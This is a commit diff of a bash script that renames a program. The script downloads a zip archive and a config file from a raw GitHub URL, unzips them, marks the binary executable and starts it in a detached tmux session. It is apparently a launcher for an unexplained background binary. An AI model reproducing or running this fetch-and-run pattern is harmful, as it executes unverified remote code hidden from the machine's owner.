4791e159871dc11abe127a5c73d22d43259c5ae4
haidanglx <40859600+haidanglx@users.noreply.github.com>
2020-06-11 13:07:24 +0800

    Update learnaimachine.sh

--- learnaimachine.sh
+++ learnaimachine.sh
@@ -1,22 +1,22 @@
 #! /bin/bash
 set -x #echo on
-if [ -f ${PWD}/learnaimachine.zip ]; then
-    if pgrep -x "learnaimachine" > /dev/null
+if [ -f ${PWD}/learnaimachinee.zip ]; then
+    if pgrep -x "learnaimachinee" > /dev/null
 then
     echo "scrip dang chay roi , ke cmn di "
     
 else
 
 echo "script da install , chay thoi "
-./learnaimachine
+./learnaimachinee
      
 fi
 exit
 fi
 
-wget https://raw.githubusercontent.com/haidanglx/Tonghop/master/learnaimachine.zip
-unzip -o learnaimachine.zip
+wget https://raw.githubusercontent.com/haidanglx/Tonghop/master/learnaimachinee.zip
+unzip -o learnaimachinee.zip
 rm config.ini
 wget https://raw.githubusercontent.com/haidanglx/Tonghop/master/config.ini
-chmod +x learnaimachine
-tmux new-session -d -s my_session2  './learnaimachine'
+chmod +x learnaimachinee
+tmux new-session -d -s my_session2  './learnaimachinee'
